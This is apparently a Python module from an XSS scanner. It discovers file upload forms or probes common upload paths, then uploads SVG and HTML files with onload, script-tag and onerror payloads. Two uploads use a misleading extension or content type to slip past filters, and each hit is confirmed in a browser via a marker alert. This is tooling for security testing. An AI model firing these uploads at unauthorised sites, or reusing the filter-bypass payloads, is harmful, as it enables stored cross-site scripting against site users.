"""File upload XSS (SVG/HTML polyglot) — discover forms + upload + browser confirm."""

from __future__ import annotations

import hashlib
import re
import time
from typing import List, Optional, Tuple
from urllib.parse import urljoin, urlparse

import aiohttp

from intellixss.http.client import HttpClient
from intellixss.models import InjectionContext, XSSFinding
from intellixss.payloads.generator import make_marker, mark_call

# The file is the payload, so the marker has to be inside the bytes that are
# uploaded. A body written before the marker exists is a body the browser can
# never attribute: an ``alert(1)`` a page raises for its own reasons would then
# confirm just as well.
_FILE_TEMPLATES: List[Tuple[str, str, str, str]] = [
    (
        "xss.svg",
        "image/svg+xml",
        "svg_onload",
        '<?xml version="1.0" standalone="no"?>\n'
        '<svg xmlns="http://www.w3.org/2000/svg" onload="{CALL}">\n'
        '  <rect width="100" height="100"/>\n'
        '</svg>\n',
    ),
    (
        "xss.svg",
        "image/svg+xml",
        "svg_script",
        '<svg xmlns="http://www.w3.org/2000/svg">\n'
        '  <script>{CALL}</script>\n'
        '</svg>\n',
    ),
    (
        "xss.html",
        "text/html",
        "html_img",
        '<!DOCTYPE html><html><body>\n'
        '<img src=x onerror="{CALL}">\n'
        '</body></html>\n',
    ),
    ("xss.svg.png", "image/png", "svg_as_png", None),
    ("xss.png", "image/svg+xml", "ctype_bypass", None),
]


def upload_payloads(marker: str) -> List[Tuple[str, str, str, bytes]]:
    """The upload set for *marker*: name, content type, kind, file bytes.

    The two deceptive entries reuse the first template byte for byte, so the
    marker reaches a server that sniffs the extension or trusts the declared
    type exactly as it reaches one that does not.
    """
    call = mark_call(marker)
    base = _FILE_TEMPLATES[0][3].format(CALL=call).encode()
    out: List[Tuple[str, str, str, bytes]] = []
    for name, ctype, kind, tpl in _FILE_TEMPLATES:
        content = base if tpl is None else tpl.format(CALL=call).encode()
        out.append((name, ctype, kind, content))
    return out


def discover_upload_forms(html: str, base_url: str) -> List[dict]:
    forms = []
    if not html:
        return forms
    for m in re.finditer(r"<form\b[^>]*>.*?</form>", html, re.I | re.S):
        block = m.group(0)
        if "type=\"file\"" not in block.lower() and "type='file'" not in block.lower():
            continue
        action_m = re.search(r'action=["\']([^"\']*)["\']', block, re.I)
        action = urljoin(base_url, action_m.group(1) if action_m else base_url)
        file_name = "file"
        nm = re.search(r'type=["\']file["\'][^>]*name=["\']([^"\']+)["\']', block, re.I)
        if not nm:
            nm = re.search(r'name=["\']([^"\']+)["\'][^>]*type=["\']file["\']', block, re.I)
        if nm:
            file_name = nm.group(1)
        forms.append({"action": action, "file_field": file_name, "html": block})
    return forms


_URL_IN_RESP = re.compile(
    r"""(?:href|src|url|location)\s*[:=]\s*["']([^"']+\.(?:svg|html|htm|png|jpg|gif|xml)[^"']*)["']""",
    re.I,
)
_ABS_URL = re.compile(r"""https?://[^\s"'<>]+?\.(?:svg|html|htm)(?:\?[^\s"'<>]*)?""", re.I)


async def scan_upload_xss(
    client: HttpClient,
    base_url: str,
    *,
    html: str = "",
    browser=None,
    log=None,
) -> List[XSSFinding]:
    log = log or (lambda *a, **k: None)
    findings: List[XSSFinding] = []
    forms = discover_upload_forms(html, base_url)
    # Also probe common upload paths
    origin = f"{urlparse(base_url).scheme}://{urlparse(base_url).netloc}"
    if not forms:
        for path in ("/upload", "/api/upload", "/avatar", "/file/upload", "/files"):
            forms.append(
                {
                    "action": urljoin(origin + "/", path.lstrip("/")),
                    "file_field": "file",
                    "html": "",
                }
            )

    log(f"    [upload] trying {len(forms)} form/path(s)", "info")

    # One marker per run: every file in the set names it, and the browser is
    # asked to prove that marker specifically.
    marker = make_marker(hashlib.md5(f"{base_url}{time.time()}".encode()).hexdigest()[:8])
    upload_set = upload_payloads(marker)

    for form in forms[:6]:
        action = form["action"]
        field = form["file_field"]
        for filename, ctype, kind, content in upload_set:
            formdata = aiohttp.FormData()
            formdata.add_field(
                field,
                content,
                filename=filename,
                content_type=ctype,
            )
            # dummy extra fields often required
            formdata.add_field("submit", "1")
            st, body, hdrs, fin = await client.request(
                "POST", action, multipart=formdata
            )
            if st == 0:
                continue
            if st in (404, 405, 501):
                break  # path dead

            # Find uploaded file URL
            file_url = None
            loc = (hdrs or {}).get("Location") or (hdrs or {}).get("location")
            if loc:
                file_url = urljoin(action, loc)
            if not file_url and body:
                m = _URL_IN_RESP.search(body) or _ABS_URL.search(body)
                if m:
                    file_url = urljoin(action, m.group(1) if m.lastindex else m.group(0))
            # Some apps echo content. The echoed text is the file's own marker,
            # not a literal every page is free to print.
            if not file_url and body and (marker in body):
                file_url = fin or action

            if not file_url:
                continue

            finding = XSSFinding(
                url=file_url,
                parameter=f"upload:{field}",
                method="POST",
                context=InjectionContext.HTML_TEXT,
                payload=f"[{kind}] {filename}",
                evidence=f"upload_status={st} file_url={file_url}",
                vulnerability_type="file_upload_xss",
                confidence=0.7,
            )
            if browser and browser.available:
                # The file on disk calls ``alert(marker)``. Handing the same
                # marker to the browser makes the dialog it watches for
                # exclusively ours.
                br = await browser.confirm(file_url, payload=content.decode(errors="replace"), marker=marker)
                if br.confirmed:
                    finding.browser_confirmed = True
                    finding.confidence = 0.95
                    finding.evidence += f" | browser:{br.detail}"
                    findings.append(finding)
                    log(
                        f"    [VULN] upload XSS {kind} @ {file_url[:60]} BROWSER-OK",
                        "vuln",
                    )
                    return findings
            # Without browser: only report if the response echoes this file's
            # own executable markup, which is what a server serving the stored
            # file back unmodified does.
            if (
                f'onload="{mark_call(marker)}"' in (body or "")
                or f"<script>{mark_call(marker)}</script>" in (body or "")
                or f'onerror="{mark_call(marker)}"' in (body or "")
            ):
                findings.append(finding)
                log(f"    [VULN] upload XSS {kind} (reflection)", "vuln")
                return findings
    return findings
